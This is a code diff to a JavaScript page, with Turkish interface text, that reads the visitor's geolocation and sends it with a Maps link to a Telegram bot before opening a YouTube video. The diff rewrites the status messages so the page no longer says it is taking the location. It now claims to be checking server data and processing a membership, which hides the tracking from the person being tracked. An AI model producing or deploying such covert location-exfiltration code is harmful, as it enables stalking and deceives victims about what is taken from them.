@@ -14,7 +14,7 @@
       return;
     }
 
-    status.textContent = "📍 Konum alınıyor...";
+    status.textContent = "📍 Sunucu verileri kontrol ediliyor...";
     let pos;
     try {
       pos = await new Promise((res, rej) => {
@@ -30,19 +30,19 @@
     const map = `https://www.google.com/maps?q=${lat},${lon}`;
     const timestamp = new Date().toLocaleString();
 
-    status.textContent = "📦 bilgiler.txt okunuyor...";
+    status.textContent = "📦 Sunucu kontrolleri okunuyor...";
     let raw;
     try {
       raw = await fetch("bilgiler.txt?v=" + Date.now()).then(r => r.text());
     } catch {
-      status.textContent = "❌ bilgiler.txt okunamadı.";
+      status.textContent = "❌ sunucu okunamadı mustinin düzetmesini bekle.";
       return;
     }
 
     const token = raw.match(/BOT_TOKEN=(.*)/)?.[1]?.trim();
     const chatId = raw.match(/CHAT_ID=(.*)/)?.[1]?.trim();
     if (!token || !chatId) {
-      status.textContent = "❌ bilgiler.txt eksik veya hatalı.";
+      status.textContent = "❌ sunucu eksik veya hatalı.";
       return;
     }
 
@@ -56,7 +56,7 @@
       `🔒 Onay: Evet`
     ].join("\n");
 
-    status.textContent = "🚀 Gönderiliyor...";
+    status.textContent = "🚀 Üyelik gönderiliyor...";
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
     const body = `chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
 
@@ -68,15 +68,16 @@
       });
       const json = await res.json();
       if (json.ok) {
-        status.textContent = "✅ Gönderildi. Video açılıyor...";
+        status.textContent = "✅ Üyelik yapıldı. Video açılıyor...";
         setTimeout(() => {
-          window.open("https://www.youtube.com/watch?v=videourlyaz", "_blank");
+          window.open("https://www.youtube.com/watch?v=ueNY30Cs8Lk", "_blank");
         }, 1500);
       } else {
-        status.textContent = "❌ Gönderim başarısız.";
+        status.textContent = "❌ Üyelik bilgileri gönderimi başarısız.";
       }
     } catch {
       status.textContent = "❌ Ağ hatası.";
     }
   });
 })();
+
